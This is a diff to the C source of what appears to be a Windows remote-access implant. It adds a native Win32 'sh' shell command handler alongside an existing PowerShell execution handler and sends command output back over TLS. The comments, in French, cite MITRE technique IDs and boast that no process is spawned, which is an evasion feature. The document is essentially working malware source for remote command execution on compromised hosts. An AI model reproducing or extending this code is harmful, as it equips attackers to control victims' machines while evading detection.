@@ -54,6 +54,7 @@
 
 #include "tls.h"
 #include "privesc.h"
+#include "../payloads/shell.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -290,6 +291,32 @@ int main(void) {
             /* ps <commande> — exécution PowerShell (T1059.001) */
             if (strncmp(cmd, "ps ", 3) == 0) {
                 int out_len = exec_ps(cmd + 3, buf, BUFFER_SIZE - 4);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* sh <commande> — shell built-in natif via Win32 API (T1059)
+             * Exécute des commandes système sans spawn de cmd.exe :
+             * ls, cd, pwd, cat, write, del, mkdir, rmdir, cp, mv,
+             * whoami, sysinfo, ps, netstat. Zéro processus créé. */
+            if (strncmp(cmd, "sh ", 3) == 0) {
+                char *out = shell_execute(cmd + 3);
+                int out_len;
+
+                if (out != NULL) {
+                    out_len = (int)strlen(out);
+                    if (out_len > BUFFER_SIZE - 5)
+                        out_len = BUFFER_SIZE - 5;
+                    memcpy(buf, out, out_len);
+                    free(out);
+                } else {
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                            "[sh] unknown built-in command — try 'sh help'\r\n");
+                }
                 buf[out_len]     = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
